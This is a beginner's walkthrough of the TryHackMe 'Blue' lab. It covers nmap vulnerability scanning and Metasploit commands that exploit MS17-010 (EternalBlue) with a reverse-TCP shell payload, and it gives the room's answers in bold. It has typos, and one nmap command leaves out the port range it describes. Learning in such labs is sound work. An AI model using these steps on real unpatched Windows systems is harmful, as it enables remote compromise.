---
layout: page
title: Blue
permalink: /Tutorials/TryHackMe/Blue/
---

[TryHackMe Directory](https://zacvr.github.io/Tutorials/TryHackMe/)
<br/><br/>
<br/><br/>
<br/><br/>
Flags will be **BOLD**
<br/><br/>
<br/><br/>
<br/><br/>
I used this page to help learn more Nmap commands maybe you can to!
<br/><br/>
https://www.stationx.net/nmap-cheat-sheet/
<br/><br/>
Start the machine and the connect using your Open VPN
<br/><br/>
Run "nmap *IP of Active machine*" to scan 1000 common ports
<br/><br/>
<img src="/images/TryHackMe/Blue/Blue-Port Count.PNG">
<br/><br/>
We now have the first Flag!
<br/>
**"3"** is the number of open ports under 1000
<br/><br/>
Now we need to see what the machine is vulnerable to
<br/><br/>
lets run a quick command on those 3 ports
<br/><br/>
"nmap --script vuln -p *IP of Active machine* -v"
<br/><br/>
"--script vuln" will load in scripts to scan on the target IP/Ports
<br/>
"-p 135-445" will scan ports 135-445 with those vulnerability script
<br/>
"-v" increases the verbosity *adds more words* (you can use -vv for a greater effect)
<br/><br/>
<img src="/images/TryHackMe/Blue/Blue-MS17.PNG">
<br/><br/>
Now we have our final flag of task 1!
<br/><br/>
in our command we see **"ms17-010"** it even shows the disclosure date right below the red box
<br/><br/>
<br/><br/>
**TASK 2**
<br/><br/>
We will need to use Metasploit for this portion
<br/><br/>
Lets run "msfdb init" (MetaSploit Framework DataBase Initialize)
<br/><br/>
Now lets run "msfdb start" to make sure the database is started
<br/><br/>
<br/><br/>
**Previous steps may not be needed** lets run "msfconsole"
<br/><br/>
Once we get ourt ASCII art we can run the next command
<br/><br/>
"search ms17-010"
<br/><br/>
This will show several options but since weknow we have a Windows machine we can try those first
<br/><br/>
"use 2" will choose the second choice
<br/><br/>
**"xploit/windows/smb/ms17_010_eternalblue" is the answer for the full path of the code**
br/><br/>
Next up "Set RHOSTS *IP of Active machine*"
<br/><br/>
**"RHOSTS" is the answer for the name of the value**
<br/><br/>
"show options" will show all the required areas are now done
<br/><br/>
The room wants us to use "set payload windows/x64/shell/reverse_tcp" before we do the next step
<br/><br/>
all we have to do now is type "run"
<br/><br/>
<br/><br/>
<br/><br/>
<br/><br/>
<br/><br/>
<br/><br/>
<br/><br/>
<br/><br/>
<br/><br/>
<br/><br/>
<br/><br/>
<br/><br/>
<br/><br/>
<br/><br/>
<br/><br/>
<br/><br/>
<br/><br/>
<br/><br/>
<br/><br/>
<br/><br/>
<br/><br/>
<br/><br/>
<br/><br/>
<br/><br/>
<br/><br/>
<br/><br/>
<br/><br/>
<br/><br/>
<br/><br/>
<br/><br/>
<br/><br/>
<br/><br/>
<br/><br/>
<br/><br/>
<br/><br/>
<br/><br/>
<br/><br/>
<br/><br/>
<br/><br/>
<br/><br/>
<br/><br/>
<br/><br/>
<br/><br/>
<br/><br/>
<br/><br/>
<br/><br/>
<br/><br/>
<br/><br/>
<br/><br/>
<br/><br/>
<br/><br/>
<br/><br/>
<br/><br/>
<br/><br/>
<br/><br/>
<br/><br/>
[TryHackMe Directory](https://zacvr.github.io/Tutorials/TryHackMe/)
